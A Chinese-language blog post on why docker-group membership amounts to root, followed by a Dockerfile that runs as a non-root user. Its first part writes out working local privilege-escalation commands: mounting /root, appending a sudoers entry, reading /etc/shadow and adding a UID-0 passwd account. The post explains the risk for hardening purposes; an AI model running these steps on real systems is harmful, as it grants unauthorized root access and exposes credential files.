---
title: Docker中Root权限的危害性
date: 2022-08-12 20:14:52
slug: docker-root-danger
tags:
  - Docker
  - Security
categories:
  - Security
  - Container

---

## 一、在docker使用root用户越权案例

如果一个普通用户，并且这个用户在docker组，则这个用户已经是root了。

### 方法一

假如我们有一个用户demo，它本身不具有sudo的权限，所以就有很多文件无法进行读写操作，例如它无法查看 /root 目录

```bash
sudo adduser demo
sudo groupadd docker
```

```bash
demo@ubuntu-VirtualBox:/home$ sudo ls /root
[sudo] password for demo: 
demo is not in the sudoers file.  This incident will be reported.
```

但是这个用户在docker的group里，具有执行docker的权限

```bash
demo@ubuntu-VirtualBox:/home$ groups
demo docker
demo@ubuntu-VirtualBox:/home$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
busybox             latest              a416a98b71e2        3 weeks ago         4.26MB
ubuntu              18.04               f9a80a55f492        2 months ago        63.2MB
```

那么，我们就可以通过docker做很多越权的事情了。比如，我们可以把无法查看 /root目录映射到 docker 容器里，就可以自由进行查看了。

```bash
demo@ubuntu-VirtualBox:/home$ docker run -it -v /root/:/root/tmp busybox sh
/ # 
/ # cd /root
~ # ls
tmp
```

甚至我们可以给demo用户加sudo权限。

```bash
// 没有sudo权限
demo@ubuntu-VirtualBox:/home/ubuntu$ sudo vim /etc/sudoers
[sudo] password for demo: 
demo is not in the sudoers file.  This incident will be reported.
demo@ubuntu-VirtualBox:/home/ubuntu$ 
```

```bash
// 加sudo权限
demo@ubuntu-VirtualBox:/home$ docker run -it -v /etc/sudoers:/root/sudoers busybox sh
/ # 
/ # echo "demo    ALL=(ALL)       ALL" >> /root/sudoers
/ # cat /root/sudoers | grep demo
demo    ALL=(ALL)       ALL
```

退出容器，就有用户demo就有sudo权限了。


### 方法二

将 /etc/ 目录挂载进 Docker，查看 shadow 和 passwd

```bash
adduser test
usermod -G docker test
```

```bash
docker run -v /etc/:/mnt -it alpine
cd /mnt
cat shadow
```

```bash
openssl passwd -1 -salt test-docker

echo 'test-docker:saltpasswd:0:0::/root:/bin/bash' >>passwd
```

```bash
ubuntu@ubuntu-VirtualBox:/tmp$ su test-docker
Password: xxx
root@ubuntu-VirtualBox:/tmp# 
```



## 二、如何使用非root用户

使用root用户的Dockerfile

```dockerfile
FROM python:3.9.5-slim

RUN pip install flask

COPY app.py /src/app.py

WORKDIR /src
ENV FLASK_APP=app.py

EXPOSE 5000

CMD ["flask", "run", "-h", "0.0.0.0"]
```

不使用root用户的Dockerfile，指定特定的用户和用户组flask

```dockerfile
FROM python:3.9.5-slim

RUN pip install flask && \
    groupadd -r flask && useradd -r -g flask flask && \
    mkdir /src && \
    chown -R flask:flask /src

USER flask

COPY app.py /src/app.py

WORKDIR /src
ENV FLASK_APP=app.py

EXPOSE 5000

CMD ["flask", "run", "-h", "0.0.0.0"]
```

